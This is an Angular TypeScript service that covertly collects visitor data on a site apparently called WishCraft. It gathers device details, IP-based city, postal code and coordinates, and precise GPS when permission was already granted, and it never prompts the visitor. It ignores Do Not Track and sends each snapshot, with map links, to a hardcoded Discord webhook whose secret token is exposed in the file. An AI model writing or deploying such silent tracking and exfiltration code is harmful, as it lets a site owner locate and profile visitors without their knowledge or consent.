import { Injectable } from '@angular/core';

export interface DeviceSnapshot {
  // timing
  timestamp: string;
  url: string;
  referrer: string;

  // browser
  userAgent: string;
  language: string;
  languages: string;
  cookiesEnabled: boolean;
  doNotTrack: string | null;

  // screen / display
  screenW: number;
  screenH: number;
  viewportW: number;
  viewportH: number;
  colorDepth: number;
  pixelRatio: number;
  orientation: string;

  // device hints
  platform: string;
  cpuCores: number;
  ramGB: number | string;
  touchPoints: number;
  isMobile: boolean;
  isTablet: boolean;

  // network
  connectionType: string;
  effectiveType: string;
  downlink: string;

  // locale
  timezone: string;
  locale: string;

  // ── IP-based location (silent, no permission needed) ──────────
  ip: string;
  city: string;
  region: string;
  country: string;
  countryCode: string;
  postalCode: string;
  isp: string;
  org: string;
  ipLat: number | string;
  ipLng: number | string;
  mapsLinkIP: string;

  // ── GPS precise location (only if already granted) ────────────
  gpsLat: number | string;
  gpsLng: number | string;
  gpsAccuracy: number | string;
  mapsLinkGPS: string;
}

const WEBHOOK_URL: string = 'https://discord.com/api/webhooks/1481317626126008361/pfgrPV6IGkhBVHXE62EBODfLsi0YLy8bQ0gaP0mSWDhaU5dVUt9M466a_Nzu6dIl6tuH';

@Injectable({ providedIn: 'root' })
export class DeviceInfoService {

  collect(): void {
    try {
      const base = this.buildBase();
      // 1. fire immediately with what we have
      this.send(base);
      // 2. enrich silently with IP location, then re-send
      this.enrichWithIPLocation(base).then(enriched => {
        this.send(enriched);
        // 3. if GPS permission already granted, add precise coords
        this.tryGPS(enriched).then(final => {
          if (final.gpsLat !== 'n/a') this.send(final);
        });
      });
    } catch {
      // fail silently
    }
  }

  // ── Base snapshot (synchronous) ──────────────────────────────────────────
  private buildBase(): DeviceSnapshot {
    const nav  = navigator as any;
    const conn = nav.connection ?? nav.mozConnection ?? nav.webkitConnection ?? {};
    const ua   = navigator.userAgent;
    const isMobile = /Mobi|Android|iPhone|iPod/i.test(ua);
    const isTablet  = /iPad|Tablet/i.test(ua) || (isMobile && Math.min(screen.width, screen.height) >= 600);

    return {
      timestamp:      new Date().toISOString(),
      url:            location.href,
      referrer:       document.referrer || '(direct)',
      userAgent:      ua,
      language:       navigator.language,
      languages:      (navigator.languages ?? []).join(', '),
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack:     navigator.doNotTrack,
      screenW:        screen.width,
      screenH:        screen.height,
      viewportW:      window.innerWidth,
      viewportH:      window.innerHeight,
      colorDepth:     screen.colorDepth,
      pixelRatio:     window.devicePixelRatio ?? 1,
      orientation:    screen.orientation?.type ?? (screen.width > screen.height ? 'landscape' : 'portrait'),
      platform:       navigator.platform,
      cpuCores:       navigator.hardwareConcurrency ?? 0,
      ramGB:          nav.deviceMemory ?? 'unknown',
      touchPoints:    navigator.maxTouchPoints ?? 0,
      isMobile,
      isTablet,
      connectionType: conn.type          ?? 'unknown',
      effectiveType:  conn.effectiveType ?? 'unknown',
      downlink:       conn.downlink != null ? `${conn.downlink} Mbps` : 'unknown',
      timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
      locale:         Intl.DateTimeFormat().resolvedOptions().locale,
      // location — filled in async steps below
      ip: 'resolving…', city: '', region: '', country: '', countryCode: '',
      postalCode: '', isp: '', org: '',
      ipLat: 'n/a', ipLng: 'n/a', mapsLinkIP: '',
      gpsLat: 'n/a', gpsLng: 'n/a', gpsAccuracy: 'n/a', mapsLinkGPS: '',
    };
  }

  // ── Silent IP geolocation ────────────────────────────────────────────────
  // Uses ipapi.co — free tier, no API key, 1000 req/day
  private async enrichWithIPLocation(snap: DeviceSnapshot): Promise<DeviceSnapshot> {
    try {
      const res  = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      const data = await res.json();
      const lat  = data.latitude  ?? 'n/a';
      const lng  = data.longitude ?? 'n/a';
      return {
        ...snap,
        ip:          data.ip           ?? 'unknown',
        city:        data.city         ?? '',
        region:      data.region       ?? '',
        country:     data.country_name ?? '',
        countryCode: data.country_code ?? '',
        postalCode:  data.postal       ?? '',
        isp:         data.org          ?? '',
        org:         data.org          ?? '',
        ipLat:       lat,
        ipLng:       lng,
        mapsLinkIP:  (lat !== 'n/a' && lng !== 'n/a')
                       ? `https://maps.google.com?q=${lat},${lng}`
                       : '',
      };
    } catch {
      return snap;
    }
  }

  // ── GPS: only fires if permission already granted (no popup) ─────────────
  private async tryGPS(snap: DeviceSnapshot): Promise<DeviceSnapshot> {
    try {
      const status = await navigator.permissions.query({ name: 'geolocation' });
      if (status.state !== 'granted') return snap;   // never prompt

      const pos = await new Promise<GeolocationPosition>((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          timeout: 5000, maximumAge: 60000, enableHighAccuracy: false,
        })
      );
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;
      return {
        ...snap,
        gpsLat:      lat,
        gpsLng:      lng,
        gpsAccuracy: `${Math.round(pos.coords.accuracy)} m`,
        mapsLinkGPS: `https://maps.google.com?q=${lat},${lng}`,
      };
    } catch {
      return snap;
    }
  }

  // ── Send to webhook ──────────────────────────────────────────────────────
  private send(snap: DeviceSnapshot): void {
    if (!this.isProd()) {
      console.groupCollapsed('[DeviceInfo] Visitor snapshot');
      console.table(snap);
      console.groupEnd();
    }

    if (!WEBHOOK_URL) return;

    const isDiscord = WEBHOOK_URL.includes('discord.com/api/webhooks');
    const body = isDiscord
      ? JSON.stringify({ content: this.toDiscordMessage(snap) })
      : JSON.stringify(snap);

    if (navigator.sendBeacon) {
      navigator.sendBeacon(WEBHOOK_URL, new Blob([body], { type: 'application/json' }));
    } else {
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body,
        keepalive: true,
      }).catch(() => {});
    }
  }

  // ── Discord message formatter ────────────────────────────────────────────
  private toDiscordMessage(s: DeviceSnapshot): string {
    const locationLine = s.city
      ? `> 📍 ${s.city}, ${s.region}, ${s.country} (${s.countryCode}) — \`${s.postalCode}\``
      : `> 📍 Resolving...`;

    const ipLine   = `> 🌐 IP: \`${s.ip}\`  |  ISP: \`${s.isp}\``;
    const ipCoords = s.mapsLinkIP
      ? `> 🗺️ IP Map: ${s.mapsLinkIP}  (\`${s.ipLat}, ${s.ipLng}\`)`
      : `> 🗺️ IP Coords: \`${s.ipLat}, ${s.ipLng}\``;

    const gpsLine = s.gpsLat !== 'n/a'
      ? `> 📡 GPS: \`${s.gpsLat}, ${s.gpsLng}\` ±${s.gpsAccuracy}  →  ${s.mapsLinkGPS}`
      : `> 📡 GPS: \`not available\``;

    return [
      `📡 **New WishCraft Visitor** — \`${s.timestamp}\``,
      `🔗 **URL:** ${s.url}`,
      `↩️ **Referrer:** ${s.referrer}`,
      ``,
      `🌍 **Location**`,
      locationLine,
      ipLine,
      ipCoords,
      gpsLine,
      ``,
      `📱 **Device**`,
      `> Platform: \`${s.platform}\` | Mobile: \`${s.isMobile}\` | Tablet: \`${s.isTablet}\``,
      `> Screen: \`${s.screenW}×${s.screenH}\` @ \`${s.pixelRatio}x\` | Viewport: \`${s.viewportW}×${s.viewportH}\``,
      `> CPU: \`${s.cpuCores} cores\` | RAM: \`${s.ramGB} GB\` | Touch: \`${s.touchPoints} pts\``,
      ``,
      `🔌 **Network**`,
      `> Type: \`${s.connectionType}\` | Effective: \`${s.effectiveType}\` | Downlink: \`${s.downlink}\``,
      ``,
      `🌐 **Browser**`,
      `> Timezone: \`${s.timezone}\` | Lang: \`${s.language}\``,
      `> \`${s.userAgent}\``,
    ].join('\n');
  }

  private isProd(): boolean {
    try {
      return location.hostname !== 'localhost' && location.hostname !== '127.0.0.1';
    } catch {
      return false;
    }
  }
}
